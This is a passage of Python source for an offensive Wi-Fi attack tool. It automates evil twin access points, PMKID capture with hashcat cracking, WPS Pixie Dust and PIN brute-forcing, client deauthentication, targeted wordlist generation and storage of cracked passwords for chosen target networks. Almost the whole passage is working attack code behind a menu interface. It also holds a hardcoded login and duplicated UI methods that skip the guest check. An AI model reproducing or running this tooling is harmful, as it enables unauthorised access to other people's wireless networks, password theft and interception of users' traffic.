        self.captured_passwords = []
    
    def setup(self, ssid: str, channel: int, output_dir: str = "evil_twin"):
        output_path = Path(output_dir)
        output_path.mkdir(exist_ok=True)
        
        hostapd_conf = output_path / 'hostapd.conf'
        with open(hostapd_conf, 'w') as f:
            f.write(f"""interface={self.iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=temporarypass123
""")
        
        dnsmasq_conf = output_path / 'dnsmasq.conf'
        with open(dnsmasq_conf, 'w') as f:
            f.write(f"""interface={self.iface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
""")
        
        return str(hostapd_conf), str(dnsmasq_conf)
    
    def start(self, hostapd_conf: str, dnsmasq_conf: str):
        try:
            subprocess.run(['sudo', 'ip', 'addr', 'add', '10.0.0.1/24', 
                          'dev', self.iface], capture_output=True)
            
            self.hostapd_proc = subprocess.Popen(['sudo', 'hostapd', hostapd_conf],
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE)
            time.sleep(2)
            
            self.dnsmasq_proc = subprocess.Popen(['sudo', 'dnsmasq', '-C', dnsmasq_conf],
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE)
        except Exception:
            self.stop()
    
    def stop(self):
        if self.hostapd_proc:
            self.hostapd_proc.terminate()
        if self.dnsmasq_proc:
            self.dnsmasq_proc.terminate()
        try:
            subprocess.run(['sudo', 'ip', 'addr', 'del', '10.0.0.1/24', 
                          'dev', self.iface], capture_output=True)
        except Exception:
            pass

class PMKID:
    def __init__(self, iface: str):
        self.iface = iface
    
    def capture(self, bssid: str, timeout: int = 60) -> Optional[str]:
        output = f'/tmp/pmkid_{int(time.time())}'
        
        try:
            result = subprocess.run(['sudo', 'hcxdumptool', '-i', self.iface,
                                   '-o', f'{output}.pcapng',
                                   '--enable_status=1',
                                   f'--filterlist_ap={bssid}'],
                                  timeout=timeout, capture_output=True)
            
            subprocess.run(['hcxpcapngtool', '-o', f'{output}.hc22000',
                          f'{output}.pcapng'], timeout=10, capture_output=True)
            
            if os.path.exists(f'{output}.hc22000'):
                return f'{output}.hc22000'
        except Exception:
            pass
        return None
    
    def crack(self, pmkid_file: str, wordlist: str) -> Optional[str]:
        try:
            result = subprocess.run(['hashcat', '-m', '22000', pmkid_file,
                                   wordlist, '--force'],
                                  capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if ':' in line and len(line.split(':')) > 1:
                        return line.split(':')[-1].strip()
        except Exception:
            pass
        return None

class Core:
    def __init__(self):
        self.db = DB()
        self.net = NetIface()
        self.wlgen = WLGen()
        self.scanner = None
        self.capturer = None
        self.cracker = Cracker(threads=8)
        self.wps = None
        self.evil_twin = None
        self.pmkid_attack = None
        self.current_iface = ""
        self.monitor_enabled = False
        self.session_start = time.time()
    
    def init_iface(self) -> bool:
        if not self.net.interfaces:
            return False
        self.current_iface = self.net.interfaces[0]
        mon_iface = self.net.enable_monitor(self.current_iface)
        if mon_iface:
            self.monitor_enabled = True
            self.scanner = Scanner(mon_iface)
            self.capturer = HSCapture(mon_iface)
            self.wps = WPSAttack(mon_iface)
            self.evil_twin = EvilTwin(mon_iface)
            self.pmkid_attack = PMKID(mon_iface)
            return True
        return False
    
    def scan_networks(self, duration: int = 30, method: str = "airodump") -> List[AP]:
        if not self.scanner:
            return []
        
        if method == "manual":
            aps = self.scanner.manual_scan(duration)
        else:
            aps = self.scanner.scan(duration)
        
        for ap in aps:
            self.db.insert_ap(ap)
        return aps
    
    def analyze_target(self, bssid: str) -> Dict:
        analysis = {
            'vulnerability_score': 0,
            'attack_vectors': [],
            'estimated_difficulty': 'Unknown',
            'recommendations': []
        }
        
        ap = self.scanner.aps.get(bssid)
        if not ap:
            return analysis
        
        if ap.auth_type == AuthType.OPEN:
            analysis['vulnerability_score'] = 100
            analysis['attack_vectors'].append('No encryption')
            analysis['estimated_difficulty'] = 'Trivial'
        elif ap.auth_type == AuthType.WEP:
            analysis['vulnerability_score'] = 95
            analysis['attack_vectors'].append('WEP cracking')
            analysis['estimated_difficulty'] = 'Very Easy'
        elif ap.wps:
            analysis['vulnerability_score'] = 80
            analysis['attack_vectors'].append('WPS Pixie Dust')
            analysis['attack_vectors'].append('WPS PIN bruteforce')
            analysis['estimated_difficulty'] = 'Easy'
        elif ap.auth_type == AuthType.WPA2:
            analysis['vulnerability_score'] = 60
            analysis['attack_vectors'].append('PMKID capture')
            analysis['attack_vectors'].append('Handshake capture + dictionary')
            analysis['estimated_difficulty'] = 'Medium'
        elif ap.auth_type == AuthType.WPA3:
            analysis['vulnerability_score'] = 30
            analysis['attack_vectors'].append('Dictionary attack (limited)')
            analysis['estimated_difficulty'] = 'Hard'
        
        if len(ap.clients) > 0:
            analysis['vulnerability_score'] += 10
            analysis['attack_vectors'].append(f'Deauth attack ({len(ap.clients)} clients)')
        
        if ap.signal > -50:
            analysis['recommendations'].append('Strong signal - good for attacks')
        elif ap.signal < -70:
            analysis['recommendations'].append('Weak signal - move closer')
        
        return analysis
    
    def attack_target(self, bssid: str, channel: int, mode: str = "auto") -> Dict:
        result = {"success": False, "password": None, "method": None, "duration": 0}
        start_time = time.time()
        
        self.db.log_attack(bssid, mode, "started")
        
        ap = self.scanner.aps.get(bssid)
        if not ap:
            return result
        
        if mode == "auto":
            if ap.wps:
                pin = self.wps.pixie_dust(bssid, timeout=60)
                if pin:
                    result["success"] = True
                    result["password"] = pin
                    result["method"] = "WPS Pixie Dust"
                    result["duration"] = time.time() - start_time
                    self.db.save_password(bssid, ap.ssid, pin, "WPS")
                    return result
            
            pmkid_file = self.pmkid_attack.capture(bssid, timeout=30)
            if pmkid_file:
                wordlist = self.wlgen.gen_targeted(ap.ssid, ap.bssid, ap.vendor)
                password = self.pmkid_attack.crack(pmkid_file, wordlist)
                if password:
                    result["success"] = True
                    result["password"] = password
                    result["method"] = "PMKID"
                    result["duration"] = time.time() - start_time
                    self.db.save_password(bssid, ap.ssid, password, "PMKID")
                    return result
        
        self.net.set_channel(self.current_iface, channel)
        cap_prefix = self.capturer.start_capture(bssid, channel)
        
        time.sleep(5)
        
        clients = self.scanner.get_clients(bssid, duration=15)
        if clients:
            for client in clients[:3]:
                self.capturer.send_deauth(bssid, client, count=20)
                time.sleep(2)
        else:
            self.capturer.send_deauth(bssid, count=30)
        
        time.sleep(10)
        self.capturer.stop_capture(bssid)
        
        cap_file = f'{cap_prefix}-01.pcap'
        if not os.path.exists(cap_file):
            cap_file = f'{cap_prefix}-01.cap'
        
        if os.path.exists(cap_file):
            if self.capturer.verify_handshake(cap_file, bssid):
                wordlist = self.wlgen.gen_targeted(ap.ssid, ap.bssid, ap.vendor)
                
                password = self.cracker.crack(cap_file, bssid, wordlist)
                
                if password:
                    result["success"] = True
                    result["password"] = password
                    result["method"] = "Dictionary Attack"
                    result["duration"] = time.time() - start_time
                    self.db.save_password(bssid, ap.ssid, password, "Dictionary")
                else:
                    result["method"] = "Failed - Password not in wordlist"
            else:
                result["method"] = "Failed - No handshake captured"
        else:
            result["method"] = "Failed - Capture file not found"
        
        result["duration"] = time.time() - start_time
        status = "success" if result["success"] else "failed"
        self.db.log_attack(bssid, mode, status, result["method"], result["duration"])
        
        return result
    
    def cleanup(self):
        if self.monitor_enabled and self.current_iface:
            self.net.disable_monitor(self.current_iface)

class UI:
    def __init__(self):
        self.core = Core()
        self.authenticated = False
        self.guest_mode = False
        self.running = True
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        Write.Print("\n\nExiting gracefully\n", Colors.red_to_purple, interval=0.0001)
        if not self.guest_mode:
            self.core.cleanup()
        sys.exit(0)
    
    def _clear(self):
        os.system('clear' if platform.system() != 'Windows' else 'cls')
    
    def _banner(self):
        mode_text = " [GUEST MODE]" if self.guest_mode else "[FREE USER]"
        banner = f"""
========================================
            SHS - Revived
              -@vzexg-2 
========================================
            AS: {mode_text}
"""
        Write.Print(banner + "\n", Colors.blue_to_cyan, interval=0.0001)
    
    def _check_guest(self) -> bool:
        if self.guest_mode:
            Write.Print("\nThis feature is not available in guest mode\n", Colors.red_to_purple, interval=0.0001)
            Write.Print("Please authenticate for full access\n", Colors.red_to_purple, interval=0.0001)
            time.sleep(2)
            return True
        return False
    
    def _auth(self):
        self._clear()
        self._banner()
        Write.Print("Authentication\n\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[1] Login\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[2] Guest Mode\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[0] Exit\n\n", Colors.red_to_purple, interval=0.0001)
        
        choice = input(Colorate.Horizontal(Colors.red_to_purple, "Choice: "))
        
        if choice == "1":
            Write.Print("\n", Colors.red_to_purple, interval=0.0001)
            username = input(Colorate.Horizontal(Colors.red_to_purple, "Username: "))
            password = input(Colorate.Horizontal(Colors.red_to_purple, "Password: "))
            
            if username == "shsm" and password == "shsm00":
                self.authenticated = True
                self.guest_mode = False
                Write.Print("\nAuthentication successful\n", Colors.green_to_cyan, interval=0.0001)
                time.sleep(1)
            else:
                Write.Print("\nAuthentication failed\n", Colors.red_to_purple, interval=0.0001)
                Write.Print("Trying guest mode\n", Colors.red_to_purple, interval=0.0001)
                self.guest_mode = True
                time.sleep(2)
        elif choice == "2":
            self.guest_mode = True
            Write.Print("\nEntering guest mode\n", Colors.green_to_cyan, interval=0.0001)
            Write.Print("Limited functionality available\n", Colors.red_to_purple, interval=0.0001)
            time.sleep(2)
        else:
            sys.exit(0)
    
    def _menu(self):
        guest_indicator = " (VIEW ONLY)" if self.guest_mode else ""
        menu = f"""
[1] Network Scanner{guest_indicator}
[2] Target Analysis{guest_indicator}
[3] Attack Manager{guest_indicator}
[4] Wordlist Generator{guest_indicator}
[5] WPS Attacks{guest_indicator}
[6] Evil Twin Setup{guest_indicator}
[7] PMKID Attack{guest_indicator}
[8] Database Manager
[9] Settings{guest_indicator}
[0] Exit
"""
        Write.Print(menu + "\n", Colors.red_to_purple, interval=0.0001)
    
    def _scan_ui(self):
        if self._check_guest():
            return
        
        self._clear()
        self._banner()
        Write.Print("Network Scanner\n\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[1] Airodump Scan\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[2] Manual Raw Scan\n\n", Colors.red_to_purple, interval=0.0001)
        
        choice = input(Colorate.Horizontal(Colors.red_to_purple, "Choice: "))
        duration = input(Colorate.Horizontal(Colors.red_to_purple, "Duration [30]: "))
        duration = int(duration) if duration.isdigit() else 30
        
        method = "airodump" if choice == "1" else "manual"
        
        Write.Print(f"\nScanning for {duration} seconds\n", Colors.green_to_cyan, interval=0.0001)
        aps = self.core.scan_networks(duration, method)
        
        Write.Print(f"\nFound {len(aps)} networks\n\n", Colors.green_to_cyan, interval=0.0001)
        
        for idx, ap in enumerate(aps[:25], 1):
            info = f"[{idx:2d}] {ap.ssid[:20]:20s} {ap.bssid} CH:{ap.channel:2d} SIG:{ap.signal:4d}dBm {ap.encryption[:15]:15s} Vendor:{ap.vendor}\n"
            Write.Print(info, Colors.red_to_purple, interval=0.0001)
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    def _analysis_ui(self):
        if self._check_guest():
            return
        
        self._clear()
        self._banner()
        Write.Print("Target Analysis\n\n", Colors.red_to_purple, interval=0.0001)
        
        bssid = input(Colorate.Horizontal(Colors.red_to_purple, "Target BSSID: "))
        
        if not bssid:
            return
        
        analysis = self.core.analyze_target(bssid)
        
        Write.Print(f"\nVulnerability Score: {analysis['vulnerability_score']}/100\n", 
                   Colors.green_to_cyan, interval=0.0001)
        Write.Print(f"Difficulty: {analysis['estimated_difficulty']}\n\n", 
                   Colors.green_to_cyan, interval=0.0001)
        
        Write.Print("Attack Vectors:\n", Colors.red_to_purple, interval=0.0001)
        for vector in analysis['attack_vectors']:
            Write.Print(f"  - {vector}\n", Colors.red_to_purple, interval=0.0001)
        
        if analysis['recommendations']:
            Write.Print("\nRecommendations:\n", Colors.red_to_purple, interval=0.0001)
            for rec in analysis['recommendations']:
                Write.Print(f"  - {rec}\n", Colors.red_to_purple, interval=0.0001)
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    def _attack_ui(self):
        if self._check_guest():
            return
        
        self._clear()
        self._banner()
        Write.Print("Attack Manager\n\n", Colors.red_to_purple, interval=0.0001)
        
        bssid = input(Colorate.Horizontal(Colors.red_to_purple, "Target BSSID: "))
        channel = input(Colorate.Horizontal(Colors.red_to_purple, "Channel: "))
        
        if not bssid or not channel.isdigit():
            Write.Print("\nInvalid input\n", Colors.red_to_purple, interval=0.0001)
            time.sleep(2)
            return
        
        Write.Print("\nAttack Modes:\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[1] Auto (Try all methods)\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[2] Handshake + Dictionary\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[3] PMKID Only\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[4] WPS Only\n\n", Colors.red_to_purple, interval=0.0001)
        
        mode_choice = input(Colorate.Horizontal(Colors.red_to_purple, "Mode: "))
        
        mode_map = {"1": "auto", "2": "handshake", "3": "pmkid", "4": "wps"}
        mode = mode_map.get(mode_choice, "auto")
        
        Write.Print("\nInitiating attack sequence\n", Colors.green_to_cyan, interval=0.0001)
        Write.Print("This may take several minutes\n\n", Colors.green_to_cyan, interval=0.0001)
        
        result = self.core.attack_target(bssid, int(channel), mode)
        
        if result["success"]:
            Write.Print(f"\nSUCCESS\n", Colors.green_to_cyan, interval=0.0001)
            Write.Print(f"Password: {result['password']}\n", Colors.green_to_cyan, interval=0.0001)
            Write.Print(f"Method: {result['method']}\n", Colors.green_to_cyan, interval=0.0001)
            Write.Print(f"Duration: {result['duration']:.2f} seconds\n", Colors.green_to_cyan, interval=0.0001)
        else:
            Write.Print(f"\nAttack Failed\n", Colors.red_to_purple, interval=0.0001)
            Write.Print(f"Reason: {result['method']}\n", Colors.red_to_purple, interval=0.0001)
            Write.Print(f"Duration: {result['duration']:.2f} seconds\n", Colors.red_to_purple, interval=0.0001)
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    def _wordlist_ui(self):
        if self._check_guest():
            return
        
        self._clear()
        self._banner()
        Write.Print("Wordlist Generator\n\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[1] Targeted Wordlist\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[2] Bruteforce Wordlist\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[3] Hybrid Wordlist\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[4] Merge Wordlists\n\n", Colors.red_to_purple, interval=0.0001)
        
        choice = input(Colorate.Horizontal(Colors.red_to_purple, "Choice: "))
        
        if choice == "1":
            ssid = input(Colorate.Horizontal(Colors.red_to_purple, "Target SSID: "))
            bssid = input(Colorate.Horizontal(Colors.red_to_purple, "Target BSSID: "))
            vendor = input(Colorate.Horizontal(Colors.red_to_purple, "Vendor [optional]: "))
            
            Write.Print("\nGenerating targeted wordlist\n", Colors.green_to_cyan, interval=0.0001)
            output = self.core.wlgen.gen_targeted(ssid, bssid, vendor)
            Write.Print(f"Wordlist saved: {output}\n", Colors.green_to_cyan, interval=0.0001)
        
        elif choice == "2":
            min_len = input(Colorate.Horizontal(Colors.red_to_purple, "Min length [8]: "))
            max_len = input(Colorate.Horizontal(Colors.red_to_purple, "Max length [10]: "))
            charset = input(Colorate.Horizontal(Colors.red_to_purple, "Charset (numeric/alpha/alnum) [alnum]: "))
            
            min_len = int(min_len) if min_len.isdigit() else 8
            max_len = int(max_len) if max_len.isdigit() else 10
            charset = charset if charset else 'alnum'
            
            Write.Print("\nGenerating bruteforce wordlist\n", Colors.green_to_cyan, interval=0.0001)
            output = self.core.wlgen.gen_bruteforce(min_len, max_len, charset, 50000)
            Write.Print(f"Wordlist saved: {output}\n", Colors.green_to_cyan, interval=0.0001)
        
        elif choice == "3":
            Write.Print("\nEnter base words separated by comma\n", Colors.red_to_purple, interval=0.0001)
            words = input(Colorate.Horizontal(Colors.red_to_purple, "Words: "))
            base_words = [w.strip() for w in words.split(',')]
            
            Write.Print("\nGenerating hybrid wordlist\n", Colors.green_to_cyan, interval=0.0001)
            output = self.core.wlgen.gen_hybrid(base_words)
            Write.Print(f"Wordlist saved: {output}\n", Colors.green_to_cyan, interval=0.0001)
        
        elif choice == "4":
            Write.Print("\nEnter wordlist paths separated by comma\n", Colors.red_to_purple, interval=0.0001)
            paths = input(Colorate.Horizontal(Colors.red_to_purple, "Paths: "))
            wordlists = [p.strip() for p in paths.split(',')]
            
            Write.Print("\nMerging wordlists\n", Colors.green_to_cyan, interval=0.0001)
            output = self.core.wlgen.merge(wordlists)
            Write.Print(f"Merged wordlist: {output}\n", Colors.green_to_cyan, interval=0.0001)
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    def _wps_ui(self):
        if self._check_guest():
            return
        
        self._clear()
        self._banner()
        Write.Print("WPS Attack Manager\n\n", Colors.red_to_purple, interval=0.0001)
        
        bssid = input(Colorate.Horizontal(Colors.red_to_purple, "Target BSSID: "))
        
        Write.Print("\n[1] Pixie Dust Attack\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[2] PIN Bruteforce\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[3] Generate PIN List\n\n", Colors.red_to_purple, interval=0.0001)
        
        choice = input(Colorate.Horizontal(Colors.red_to_purple, "Choice: "))
        
        if choice == "1":
            Write.Print("\nAttempting Pixie Dust attack\n", Colors.green_to_cyan, interval=0.0001)
            pin = self.core.wps.pixie_dust(bssid, timeout=120)
            if pin:
                Write.Print(f"\nWPS PIN found: {pin}\n", Colors.green_to_cyan, interval=0.0001)
            else:
                Write.Print("\nPixie Dust attack failed\n", Colors.red_to_purple, interval=0.0001)
        
        elif choice == "2":
            Write.Print("\nPIN Source:\n", Colors.red_to_purple, interval=0.0001)
            Write.Print("[1] Basic template (25 common PINs)\n", Colors.red_to_purple, interval=0.0001)
            Write.Print("[2] Custom file\n\n", Colors.red_to_purple, interval=0.0001)
            
            source_choice = input(Colorate.Horizontal(Colors.red_to_purple, "Source: "))
            
            pin_source = "basic"
            custom_file = ""
            
            if source_choice == "2":
                custom_file = input(Colorate.Horizontal(Colors.red_to_purple, "PIN file path: "))
                if os.path.exists(custom_file):
                    pin_source = "file"
                    Write.Print(f"\nUsing custom PIN file: {custom_file}\n", Colors.green_to_cyan, interval=0.0001)
                else:
                    Write.Print("\nFile not found, using basic template\n", Colors.red_to_purple, interval=0.0001)
                    pin_source = "basic"
            else:
                Write.Print("\nUsing basic PIN template\n", Colors.green_to_cyan, interval=0.0001)
            
            Write.Print("Attempting PIN bruteforce\n", Colors.green_to_cyan, interval=0.0001)
            pin = self.core.wps.bruteforce_pin(bssid, pin_source, custom_file)
            if pin:
                Write.Print(f"\nWPS PIN found: {pin}\n", Colors.green_to_cyan, interval=0.0001)
            else:
                Write.Print("\nPIN bruteforce failed\n", Colors.red_to_purple, interval=0.0001)
        
        elif choice == "3":
            output = input(Colorate.Horizontal(Colors.red_to_purple, "Output file [wps_pins.txt]: "))
            if not output:
                output = "wps_pins.txt"
            
            count = input(Colorate.Horizontal(Colors.red_to_purple, "Number of PINs [1000]: "))
            count = int(count) if count.isdigit() else 1000
            
            Write.Print("\nGenerating PIN list\n", Colors.green_to_cyan, interval=0.0001)
            generated_file = self.core.wps.generate_pin_list(output, count)
            Write.Print(f"PIN list saved: {generated_file}\n", Colors.green_to_cyan, interval=0.0001)
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    def _evil_twin_ui(self):
        if self._check_guest():
            return
        
        self._clear()
        self._banner()
        Write.Print("Evil Twin Setup\n\n", Colors.red_to_purple, interval=0.0001)
        
        ssid = input(Colorate.Horizontal(Colors.red_to_purple, "Target SSID: "))
        channel = input(Colorate.Horizontal(Colors.red_to_purple, "Channel: "))
        
        if not ssid or not channel.isdigit():
            Write.Print("\nInvalid input\n", Colors.red_to_purple, interval=0.0001)
            time.sleep(2)
            return
        
        Write.Print("\nGenerating configuration files\n", Colors.green_to_cyan, interval=0.0001)
        hostapd_conf, dnsmasq_conf = self.core.evil_twin.setup(ssid, int(channel))
        
        Write.Print(f"\nHostapd config: {hostapd_conf}\n", Colors.green_to_cyan, interval=0.0001)
        Write.Print(f"Dnsmasq config: {dnsmasq_conf}\n", Colors.green_to_cyan, interval=0.0001)
        
        start = input(Colorate.Horizontal(Colors.red_to_purple, "\nStart Evil Twin? (y/n): "))
        
        if start.lower() == 'y':
            Write.Print("\nStarting Evil Twin\n", Colors.green_to_cyan, interval=0.0001)
            self.core.evil_twin.start(hostapd_conf, dnsmasq_conf)
            Write.Print("Evil Twin is running\n", Colors.green_to_cyan, interval=0.0001)
            input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to stop"))
            self.core.evil_twin.stop()
            Write.Print("\nEvil Twin stopped\n", Colors.red_to_purple, interval=0.0001)
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    def _pmkid_ui(self):
        if self._check_guest():
            return
        
        self._clear()
        self._banner()
        Write.Print("PMKID Attack\n\n", Colors.red_to_purple, interval=0.0001)
        
        bssid = input(Colorate.Horizontal(Colors.red_to_purple, "Target BSSID: "))
        timeout = input(Colorate.Horizontal(Colors.red_to_purple, "Capture timeout [60]: "))
        timeout = int(timeout) if timeout.isdigit() else 60
        
        Write.Print("\nCapturing PMKID\n", Colors.green_to_cyan, interval=0.0001)
        pmkid_file = self.core.pmkid_attack.capture(bssid, timeout)
        
        if pmkid_file:
            Write.Print(f"\nPMKID captured: {pmkid_file}\n", Colors.green_to_cyan, interval=0.0001)
            
            wordlist = input(Colorate.Horizontal(Colors.red_to_purple, "Wordlist path: "))
            if wordlist and os.path.exists(wordlist):
                Write.Print("\nCracking PMKID\n", Colors.green_to_cyan, interval=0.0001)
                password = self.core.pmkid_attack.crack(pmkid_file, wordlist)
                if password:
                    Write.Print(f"\nPassword found: {password}\n", Colors.green_to_cyan, interval=0.0001)
                else:
                    Write.Print("\nPassword not found\n", Colors.red_to_purple, interval=0.0001)
        else:
            Write.Print("\nPMKID capture failed\n", Colors.red_to_purple, interval=0.0001)
            Write.Print("Attempting PIN bruteforce\n", Colors.green_to_cyan, interval=0.0001)
            pin = self.core.wps.bruteforce_pin(bssid)
            if pin:
                Write.Print(f"\nWPS PIN found: {pin}\n", Colors.green_to_cyan, interval=0.0001)
            else:
                Write.Print("\nPIN bruteforce failed\n", Colors.red_to_purple, interval=0.0001)
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    def _evil_twin_ui(self):
        self._clear()
        self._banner()
        Write.Print("Evil Twin Setup\n\n", Colors.red_to_purple, interval=0.0001)
        
        ssid = input(Colorate.Horizontal(Colors.red_to_purple, "Target SSID: "))
        channel = input(Colorate.Horizontal(Colors.red_to_purple, "Channel: "))
        
        if not ssid or not channel.isdigit():
            Write.Print("\nInvalid input\n", Colors.red_to_purple, interval=0.0001)
            time.sleep(2)
            return
        
        Write.Print("\nGenerating configuration files\n", Colors.green_to_cyan, interval=0.0001)
        hostapd_conf, dnsmasq_conf = self.core.evil_twin.setup(ssid, int(channel))
        
        Write.Print(f"\nHostapd config: {hostapd_conf}\n", Colors.green_to_cyan, interval=0.0001)
        Write.Print(f"Dnsmasq config: {dnsmasq_conf}\n", Colors.green_to_cyan, interval=0.0001)
        
        start = input(Colorate.Horizontal(Colors.red_to_purple, "\nStart Evil Twin? (y/n): "))
        
        if start.lower() == 'y':
            Write.Print("\nStarting Evil Twin\n", Colors.green_to_cyan, interval=0.0001)
            self.core.evil_twin.start(hostapd_conf, dnsmasq_conf)
            Write.Print("Evil Twin is running\n", Colors.green_to_cyan, interval=0.0001)
            input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to stop"))
            self.core.evil_twin.stop()
            Write.Print("\nEvil Twin stopped\n", Colors.red_to_purple, interval=0.0001)
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    def _pmkid_ui(self):
        self._clear()
        self._banner()
        Write.Print("PMKID Attack\n\n", Colors.red_to_purple, interval=0.0001)
        
        bssid = input(Colorate.Horizontal(Colors.red_to_purple, "Target BSSID: "))
        timeout = input(Colorate.Horizontal(Colors.red_to_purple, "Capture timeout [60]: "))
        timeout = int(timeout) if timeout.isdigit() else 60
        
        Write.Print("\nCapturing PMKID\n", Colors.green_to_cyan, interval=0.0001)
        pmkid_file = self.core.pmkid_attack.capture(bssid, timeout)
        
        if pmkid_file:
            Write.Print(f"\nPMKID captured: {pmkid_file}\n", Colors.green_to_cyan, interval=0.0001)
            
            wordlist = input(Colorate.Horizontal(Colors.red_to_purple, "Wordlist path: "))
            if wordlist and os.path.exists(wordlist):
                Write.Print("\nCracking PMKID\n", Colors.green_to_cyan, interval=0.0001)
                password = self.core.pmkid_attack.crack(pmkid_file, wordlist)
                if password:
                    Write.Print(f"\nPassword found: {password}\n", Colors.green_to_cyan, interval=0.0001)
                else:
                    Write.Print("\nPassword not found\n", Colors.red_to_purple, interval=0.0001)
        else:
            Write.Print("\nPMKID capture failed\n", Colors.red_to_purple, interval=0.0001)
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    def _database_ui(self):
        self._clear()
        self._banner()
        Write.Print("Database Manager\n\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[1] View Access Points\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[2] View Cracked Passwords\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[3] View Statistics\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[4] Export Database\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[5] Clear Database\n\n", Colors.red_to_purple, interval=0.0001)
        
        choice = input(Colorate.Horizontal(Colors.red_to_purple, "Choice: "))
        
        if choice == "1":
            aps = self.core.db.get_aps()
            Write.Print(f"\nTotal Access Points: {len(aps)}\n\n", Colors.green_to_cyan, interval=0.0001)
            for idx, ap in enumerate(aps[:20], 1):
                info = f"[{idx:2d}] {ap['ssid'][:20]:20s} {ap['bssid']} {ap['encryption'][:15]:15s}\n"
                Write.Print(info, Colors.red_to_purple, interval=0.0001)
        
        elif choice == "2":
            passwords = self.core.db.get_passwords()
            Write.Print(f"\nCracked Passwords: {len(passwords)}\n\n", Colors.green_to_cyan, interval=0.0001)
            for idx, pwd in enumerate(passwords, 1):
                info = f"[{idx:2d}] {pwd['ssid'][:20]:20s} {pwd['bssid']} PWD:{pwd['password']} Method:{pwd['method']}\n"
                Write.Print(info, Colors.green_to_cyan, interval=0.0001)
        
        elif choice == "3":
            stats = self.core.db.get_stats()
            Write.Print("\nDatabase Statistics:\n\n", Colors.green_to_cyan, interval=0.0001)
            Write.Print(f"Total APs: {stats['total_aps']}\n", Colors.red_to_purple, interval=0.0001)
            Write.Print(f"Total Clients: {stats['total_clients']}\n", Colors.red_to_purple, interval=0.0001)
            Write.Print(f"Total Attacks: {stats['total_attacks']}\n", Colors.red_to_purple, interval=0.0001)
            Write.Print(f"Passwords Cracked: {stats['passwords_cracked']}\n", Colors.red_to_purple, interval=0.0001)
        
        elif choice == "4":
            format_choice = input(Colorate.Horizontal(Colors.red_to_purple, "Format (json/csv/html): "))
            timestamp = int(time.time())
            
            if format_choice == "json":
                filename = f"export_{timestamp}.json"
                aps = self.core.db.get_aps()
                with open(filename, 'w') as f:
                    json.dump(aps, f, indent=2)
            elif format_choice == "csv":
                filename = f"export_{timestamp}.csv"
                aps = self.core.db.get_aps()
                if aps:
                    keys = aps[0].keys()
                    with open(filename, 'w') as f:
                        f.write(','.join(keys) + '\n')
                        for ap in aps:
                            f.write(','.join(str(ap.get(k, '')) for k in keys) + '\n')
            else:
                filename = f"export_{timestamp}.html"
                aps = self.core.db.get_aps()
                html = "<html><head><title>WiFi Audit Report</title></head><body>"
                html += "<h1>WiFi Security Audit Report</h1>"
                html += f"<p>Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>"
                html += "<table border='1'><tr>"
                if aps:
                    for key in aps[0].keys():
                        html += f"<th>{key}</th>"
                    html += "</tr>"
                    for ap in aps:
                        html += "<tr>"
                        for value in ap.values():
                            html += f"<td>{value}</td>"
                        html += "</tr>"
                html += "</table></body></html>"
                with open(filename, 'w') as f:
                    f.write(html)
            
            Write.Print(f"\nDatabase exported to {filename}\n", Colors.green_to_cyan, interval=0.0001)
        
        elif choice == "5":
            confirm = input(Colorate.Horizontal(Colors.red_to_purple, "Clear all data? (y/n): "))
            if confirm.lower() == 'y':
                self.core.db.cursor.execute("DELETE FROM aps")
                self.core.db.cursor.execute("DELETE FROM clients")
                self.core.db.cursor.execute("DELETE FROM attacks")
                self.core.db.cursor.execute("DELETE FROM passwords")
                self.core.db.conn.commit()
                Write.Print("\nDatabase cleared\n", Colors.green_to_cyan, interval=0.0001)
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    
    def _settings_ui(self):
        if self._check_guest():
            return
        
        self._clear()
        self._banner()
        Write.Print("Settings\n\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[1] Interface Manager\n", Colors.red_to_purple, interval=0.0001)
